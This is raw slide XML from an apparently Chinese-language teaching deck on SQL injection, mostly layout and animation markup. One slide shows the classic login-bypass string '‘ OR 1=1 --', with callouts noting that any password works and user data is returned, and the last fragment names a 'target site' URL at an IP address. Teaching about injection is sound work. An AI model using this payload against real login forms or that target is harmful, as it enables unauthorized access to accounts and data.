                  <a:solidFill>
                    <a:srgbClr val="000000"/>
                  </a:solidFill>
                  <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                </a:rPr>
                <a:t> </a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="437316" name="Text Box 68"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7026275" y="1522413"/>
            <a:ext cx="977900" cy="290512"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="15875">
            <a:noFill/>
            <a:miter lim="800000"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="90000" tIns="46800" rIns="90000" bIns="46800">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>‘ OR 1=1 --</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1300" b="1">
              <a:solidFill>
                <a:srgbClr val="CC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437302"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="10" dur="1000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="437302"/>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437316"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="slide(fromLeft)">
                                      <p:cBhvr>
                                        <p:cTn id="15" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="437316"/>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437297"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="19" dur="1000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="437297"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                              <p:par>
                                <p:cTn id="20" presetID="0" presetClass="path" presetSubtype="0" accel="50000" decel="50000" fill="hold" nodeType="withEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:animMotion origin="layout" path="M -0.00399 -0.00671 C -0.00191 0.04445 -0.00851 0.2375 0.00885 0.30093 C 0.02622 0.36435 0.06892 0.37153 0.10035 0.37431 C 0.13177 0.37709 0.17899 0.38218 0.19705 0.31783 C 0.21493 0.25347 0.20694 0.04259 0.20885 -0.0125 " pathEditMode="relative" rAng="0" ptsTypes="aaaaa">
                                      <p:cBhvr>
                                        <p:cTn id="21" dur="3000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="437297"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                          <p:attrName>ppt_y</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:rCtr x="10700" y="19100"/>
                                    </p:animMotion>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                              <p:par>
                                <p:cTn id="22" presetID="10" presetClass="entr" presetSubtype="0" fill="hold" nodeType="withEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="23" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="437303"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="24" dur="1000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="43730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0" nodeType="clickEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:animEffect transition="out" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="28" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="437297"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="29" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="499"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="437297"/>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2"/>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437316"/>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437301"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="36" dur="1000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="437301"/>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437304"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="40" dur="1000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="437304"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                            </p:childTnLst>
                          </p:cTn>
                        </p:par>
                        <p:par>
                          <p:cTn id="41" fill="hold">
                            <p:stCondLst>
                              <p:cond delay="1500"/>
                            </p:stCondLst>
                            <p:childTnLst>
                              <p:par>
                                <p:cTn id="42" presetID="10" presetClass="entr" presetSubtype="0" fill="hold" grpId="1" nodeType="afterEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="43" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="437298"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="44" dur="1000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="437298"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                            </p:childTnLst>
                          </p:cTn>
                        </p:par>
                        <p:par>
                          <p:cTn id="45" fill="hold">
                            <p:stCondLst>
                              <p:cond delay="2500"/>
                            </p:stCondLst>
                            <p:childTnLst>
                              <p:par>
                                <p:cTn id="46" presetID="0" presetClass="path" presetSubtype="0" accel="50000" decel="50000" fill="hold" grpId="0" nodeType="afterEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:animMotion origin="layout" path="M -0.0007 -0.00486 C 0.00086 0.04583 -0.00799 0.23773 0.00885 0.30092 C 0.02569 0.36412 0.06892 0.37153 0.10034 0.3743 C 0.13177 0.37708 0.17899 0.38217 0.19705 0.31782 C 0.2151 0.25347 0.20711 0.04259 0.20902 -0.0125 " pathEditMode="relative" rAng="0" ptsTypes="aaaaa">
                                      <p:cBhvr>
                                        <p:cTn id="47" dur="3000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="437298"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                          <p:attrName>ppt_y</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:rCtr x="10400" y="19000"/>
                                    </p:animMotion>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37306"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="52" dur="1000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="437306"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                            </p:childTnLst>
                          </p:cTn>
                        </p:par>
                        <p:par>
                          <p:cTn id="53" fill="hold">
                            <p:stCondLst>
                              <p:cond delay="1000"/>
                            </p:stCondLst>
                            <p:childTnLst>
                              <p:par>
                                <p:cTn id="54" presetID="10" presetClass="exit" presetSubtype="0" fill="hold" nodeType="afterEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:animEffect transition="out" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="55" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="437298"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="56" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="499"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="437298"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="hidden"/>
                                      </p:to>
                                    </p:se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437299"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="60" dur="1000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="43729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37305"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="63" dur="1000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="437305"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                            </p:childTnLst>
                          </p:cTn>
                        </p:par>
                        <p:par>
                          <p:cTn id="64" fill="hold">
                            <p:stCondLst>
                              <p:cond delay="2500"/>
                            </p:stCondLst>
                            <p:childTnLst>
                              <p:par>
                                <p:cTn id="65" presetID="0" presetClass="path" presetSubtype="0" accel="50000" decel="50000" fill="hold" nodeType="afterEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:animMotion origin="layout" path="M 0.00086 0.00625 C 0.00225 0.05532 0.02031 0.23564 0.00885 0.30092 C -0.00261 0.3662 -0.03611 0.39236 -0.06789 0.39722 C -0.09966 0.40208 -0.16007 0.39444 -0.18143 0.32963 C -0.20278 0.26481 -0.19341 0.06203 -0.19584 0.00856 " pathEditMode="relative" rAng="0" ptsTypes="aaaaa">
                                      <p:cBhvr>
                                        <p:cTn id="66" dur="3000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="437299"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                          <p:attrName>ppt_y</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:rCtr x="-9200" y="19800"/>
                                    </p:animMotion>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                            </p:childTnLst>
                          </p:cTn>
                        </p:par>
                      </p:childTnLst>
                    </p:cTn>
                  </p:par>
                  <p:par>
                    <p:cTn id="67" fill="hold">
                      <p:stCondLst>
                        <p:cond delay="indefinite"/>
                      </p:stCondLst>
                      <p:childTnLst>
                        <p:par>
                          <p:cTn id="68" fill="hold">
                            <p:stCondLst>
                              <p:cond delay="0"/>
                            </p:stCondLst>
                            <p:childTnLst>
                              <p:par>
                                <p:cTn id="69" presetID="10" presetClass="exit" presetSubtype="0" fill="hold" grpId="1" nodeType="clickEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:animEffect transition="out" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="70" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="437299"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="71" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="499"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="437299"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="hidden"/>
                                      </p:to>
                                    </p:set>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                              <p:par>
                                <p:cTn id="72" presetID="10" presetClass="exit" presetSubtype="0" fill="hold" grpId="0" nodeType="withEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:animEffect transition="out" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="73" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="437301"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="74" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="499"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="437301"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="hidden"/>
                                      </p:to>
                                    </p:se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437307"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="78" dur="1000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="437307"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                              <p:par>
                                <p:cTn id="79" presetID="10" presetClass="entr" presetSubtype="0" fill="hold" nodeType="withEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="80" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="437300"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="81" dur="1000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="437300"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                              <p:par>
                                <p:cTn id="82" presetID="0" presetClass="path" presetSubtype="0" accel="50000" decel="50000" fill="hold" grpId="0" nodeType="withEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:animMotion origin="layout" path="M -0.00295 0.02847 C -0.00104 0.07407 0.01962 0.23958 0.00885 0.30092 C -0.00191 0.36227 -0.03611 0.39236 -0.06788 0.39722 C -0.09965 0.40208 -0.16007 0.39444 -0.18142 0.32963 C -0.20278 0.26481 -0.1934 0.06203 -0.19583 0.00856 " pathEditMode="relative" rAng="0" ptsTypes="aaaaa">
                                      <p:cBhvr>
                                        <p:cTn id="83" dur="3000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="437300"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                          <p:attrName>ppt_y</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:rCtr x="-8900" y="177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97" grpId="0" animBg="1"/>
      <p:bldP spid="437298" grpId="0" animBg="1"/>
      <p:bldP spid="437298" grpId="1" animBg="1"/>
      <p:bldP spid="437299" grpId="0" animBg="1"/>
      <p:bldP spid="437299" grpId="1" animBg="1"/>
      <p:bldP spid="437300" grpId="0" animBg="1"/>
      <p:bldP spid="437301" grpId="0" animBg="1"/>
      <p:bldP spid="437304" grpId="0"/>
      <p:bldP spid="437305" grpId="0" animBg="1"/>
      <p:bldP spid="437306" grpId="0"/>
      <p:bldP spid="437307" grpId="0"/>
      <p:bldP spid="437316" grpId="0"/>
      <p:bldP spid="437316"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2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>注入示例</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="438276" name="Picture 4" descr="snap"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1" noChangeArrowheads="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1" cstate="print"/>
          <a:srcRect/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="250825" y="908050"/>
            <a:ext cx="8524875" cy="5689600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="438277" name="Rectangle 5"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4643438" y="4292600"/>
            <a:ext cx="1512887" cy="215900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="15875">
            <a:solidFill>
              <a:srgbClr val="FF0000"/>
            </a:solidFill>
            <a:miter lim="800000"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="90000" tIns="46800" rIns="90000" bIns="46800" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="438280" name="AutoShape 8"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="6804025" y="3357563"/>
            <a:ext cx="1008063" cy="784225"/>
          </a:xfrm>
          <a:prstGeom prst="wedgeRectCallout">
            <a:avLst>
              <a:gd name="adj1" fmla="val -132833"/>
              <a:gd name="adj2" fmla="val 55870"/>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en-US" altLang="zh-CN" sz="1600" b="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>注入字符串</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" b="1">
              <a:solidFill>
                <a:srgbClr val="0000FF"/>
              </a:solidFill>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="438281" name="AutoShape 9"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7019925" y="4300538"/>
            <a:ext cx="1223963" cy="784225"/>
          </a:xfrm>
          <a:prstGeom prst="wedgeRectCallout">
            <a:avLst>
              <a:gd name="adj1" fmla="val -156356"/>
              <a:gd name="adj2" fmla="val -14574"/>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FF"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>口令可以填写任意值</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" b="1">
              <a:solidFill>
                <a:srgbClr val="0000FF"/>
              </a:solidFill>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="438282" name="AutoShape 10"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="3492500" y="5805488"/>
            <a:ext cx="1223963" cy="719137"/>
          </a:xfrm>
          <a:prstGeom prst="wedgeRectCallout">
            <a:avLst>
              <a:gd name="adj1" fmla="val 91116"/>
              <a:gd name="adj2" fmla="val -63023"/>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FF"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>查询到的用户资料</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600" b="1">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8276"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="438276"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="8" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4382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38277"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="13" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="438277"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_w</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_w"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="14" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="43827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38280"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="slide(fromLeft)">
                                      <p:cBhvr>
                                        <p:cTn id="19" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="438280"/>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438281"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="slide(fromLeft)">
                                      <p:cBhvr>
                                        <p:cTn id="24" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="438281"/>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grpId="0" nodeType="clickEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="28" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="438282"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="slide(fromLeft)">
                                      <p:cBhvr>
                                        <p:cTn id="29" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="438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77" grpId="0" animBg="1"/>
      <p:bldP spid="438280" grpId="0" animBg="1"/>
      <p:bldP spid="438281" grpId="0" animBg="1"/>
      <p:bldP spid="43828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82613" y="1335088"/>
            <a:ext cx="7772400" cy="4114800"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>靶网网址为</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>http://26.28.249.154/asd/wyqy/</a:t>
            </a:r>
